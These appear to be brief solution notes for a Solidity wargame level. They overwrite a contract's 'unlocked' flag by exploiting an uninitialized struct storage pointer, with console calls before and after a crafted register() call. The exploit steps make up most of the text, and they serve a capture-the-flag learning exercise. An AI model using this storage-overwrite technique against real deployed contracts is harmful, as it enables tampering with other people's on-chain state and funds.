# Sturct Storage at solidity in a function body, is total shit
# See: https://danielszego.blogspot.com/2018/12/solidity-tips-and-tricks-struct-at.html
# Getting unlock
await contract.unlocked()

# Hacking storage
contract.register("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",0x5Fb17f13465950ED8726f7ECE8CBA3dFB37566aF)

# And it has been hacked
await contract.unlocked()
  